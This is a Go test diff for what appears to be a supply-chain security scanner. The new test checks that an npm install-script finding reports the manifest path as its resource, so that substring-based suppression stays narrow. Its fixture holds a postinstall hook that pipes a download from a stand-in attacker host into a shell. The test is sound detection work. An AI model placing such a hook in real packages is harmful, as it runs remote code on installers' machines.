@@ -130,3 +130,19 @@ func TestRegistryAliasSpecsAreNotFlagged(t *testing.T) {
 		}
 	}
 }
+
+// Suppression matches on Resource as a substring, so a bare hook name would let
+// one noisy package's `postinstall` suppress every install-script finding on the
+// host. Resource must be the manifest path.
+func TestInstallScriptResourceIsManifestPath(t *testing.T) {
+	events := NewNpmEcosystem(nil).Inspect(
+		"/srv/app/package.json",
+		[]byte(`{"scripts": {"postinstall": "curl https://evil.example/p | sh"}}`),
+	)
+	if len(events) != 1 {
+		t.Fatalf("want 1 finding, got %d", len(events))
+	}
+	if events[0].Resource != "/srv/app/package.json" {
+		t.Errorf("Resource = %q, want the manifest path", events[0].Resource)
+	}
+}
